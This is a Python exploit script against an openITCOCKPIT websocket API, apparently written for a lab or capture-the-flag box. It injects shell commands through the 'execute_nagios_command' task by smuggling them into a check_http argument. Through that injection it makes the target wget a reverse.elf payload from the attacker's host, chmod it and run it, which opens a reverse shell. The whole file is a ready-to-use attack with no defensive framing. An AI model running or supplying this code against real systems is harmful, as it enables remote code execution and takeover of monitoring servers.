import websocket
import ssl
import json
import argparse
import os
import _thread as thread # To allow for execution of tasks in background

uniqid = ""
key = ""
cmd = ""
count = 0
LHOST = ""
LPORT = 0

def toJson(task,data):
	req = {
		"task": task,
		"data": data,
		"uniqid": uniqid,
		"key": key
	}
	return json.dumps(req)

def on_open(ws):
	global cmd, count, LHOST
	count = 0
	print("[+] Connection Open")
	def run():
		wrappedCmd = f'./check_http -I {LHOST} -p 80 -k \'test1 -c \'{cmd}'
		print(wrappedCmd)
		ws.send(toJson("execute_nagios_command", wrappedCmd))
	thread.start_new_thread(run, ())

def on_message(ws, message):
	global uniqid, count
	mes = json.loads(message)
	if "uniqid" in mes.keys():
		uniqid = mes["uniqid"]
	
	if mes['type'] == 'connection':
		print("[+] Connection Open")
	elif mes['type'] == 'dispatcher':
		pass
	elif mes['type'] == 'response':
		print()
		print(mes["payload"])
	else:
		print()
		print("Message: ", mes)

	# Kill after 3 rounds
	count += 1
	if count == 3:
		ws.keep_running=False

def on_error(ws, error):
	print()
	print("Error: ", error)

def on_close(ws, close_status_code, close_msg):
	print()
	print("[+] Connection Closed")
	print(close_msg)

def run_webSocket(c):
	global cmd
	cmd = c
	ws = websocket.WebSocketApp(args.url,
		on_message = on_message,
		on_error= on_error,
		on_close = on_close,
		on_open = on_open
	)
	ws.run_forever(sslopt={"cert_reqs": ssl.CERT_NONE})


def main(args):
	global key
	key = args.key
	url = args.url
	cmd = "echo \"test\""
	websocket.enableTrace(args.verbose)
	cmd1 = f"wget http://{LHOST}:8000/reverse.elf -O /tmp/reverse.elf"
	cmd2 = "chmod +x /tmp/reverse.elf"
	cmd3 = "/tmp/reverse.elf"
	run_webSocket(cmd1)
	run_webSocket(cmd2)
	run_webSocket(cmd3)

if __name__ == '__main__':
	parser = argparse.ArgumentParser()
	parser.add_argument('--url', '-u', required=True, dest='url', help='Websocket URL')
	parser.add_argument('--key', '-k', required=True, dest='key', help='openITCOCKPIT key')
	parser.add_argument('--verbose', '-v', help='Print more data', action='store_true')
	args = parser.parse_args()

	LHOST = os.popen('ip addr show tun0').read().split("inet ")[1].split("/")[0]
	LPORT = 9001
	
	main(args)
